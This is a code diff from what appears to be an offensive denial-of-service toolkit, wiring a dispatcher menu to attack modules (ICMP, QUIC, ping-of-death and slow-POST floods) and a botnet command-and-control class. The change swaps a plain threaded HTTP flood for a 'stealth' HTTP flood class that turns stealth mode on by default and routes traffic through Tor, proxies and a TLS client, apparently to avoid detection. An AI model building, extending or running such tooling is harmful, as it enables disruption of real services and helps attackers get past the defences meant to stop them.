@@ -13,6 +13,7 @@ from src.attacks import (
     payload_lab, identity_cloak, cve_explorer, web_exposure_sniper,
     icmp_flood, ping_of_death, quic_flood, mixed_flood, slowpost_attack
 )
+from src.attacks.layer7 import HTTPFloodAttack, StealthHTTPFloodAttack
 from src.utils.targets import target_mgmt
 from src.core.c2 import BotnetC2
 from src.core.menu import Menu
@@ -73,9 +74,28 @@ class AttackDispatcher:
         
         if choice == "1":
             url = get_formatted_url(target, port, "http")
-            for _ in range(threads):
-                increment_thread_counter()
-                threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)), daemon=True).start()
+            attack = StealthHTTPFloodAttack(
+                target=url,
+                threads=threads,
+                duration=duration,
+                max_requests=max_requests,
+                use_tor=params.get('use_tor', False),
+                stealth_mode=params.get('stealth_mode', True),
+                proxies=proxies,
+                use_tls_client=True
+            )
+
+            # Setup monitor callback for compatibility
+            if monitor:
+                def update_monitor(state, metrics):
+                    if state == "running":
+                        monitor.packets_sent = metrics["packets_sent"]
+                        monitor.bytes_sent = metrics["bytes_sent"]
+                        monitor.failed = metrics.get("packets_failed", 0)
+                attack.on_progress = update_monitor
+
+            attack.start()
+            return attack
 
         elif choice == "2":
             url = get_formatted_url(target, port, "https")
